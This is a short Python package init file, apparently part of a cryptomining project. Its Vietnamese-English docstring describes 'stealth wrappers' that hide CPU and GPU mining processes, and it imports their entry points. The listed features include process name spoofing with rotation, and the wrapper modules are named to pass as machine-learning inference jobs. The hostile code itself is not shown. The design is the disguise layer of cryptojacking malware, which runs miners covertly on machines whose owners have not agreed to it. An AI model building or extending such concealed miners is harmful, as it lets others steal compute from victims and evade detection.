"""mining_environment.stealth.wrappers

🎮 **[Stealth Process Wrappers]** (Bộ bọc tiến trình ẩn danh)

Wrapper scripts cho **[CPU & GPU Mining Processes]** (tiến trình khai thác CPU & GPU)
với **[Self-Stealth Capabilities]** (khả năng tự ẩn danh).

⚠️ COMPONENTS:
- **stealth_ml_inference.py**: CPU mining stealth wrapper
- **stealth_inference_cuda.py**: GPU mining stealth wrapper

✅ FEATURES:
- Symmetric protection cho cả CPU & GPU
- Process name spoofing với rotation
- Signal handling & graceful cleanup
- Exec và subprocess fallback modes
- GPU-optimized stealth names
"""

# Wrapper main functions
try:
    from .stealth_ml_inference import main as cpu_stealth_main
except ImportError:
    cpu_stealth_main = None

try:
    from .stealth_inference_cuda import main as gpu_stealth_main  
except ImportError:
    gpu_stealth_main = None

__all__ = ['cpu_stealth_main', 'gpu_stealth_main']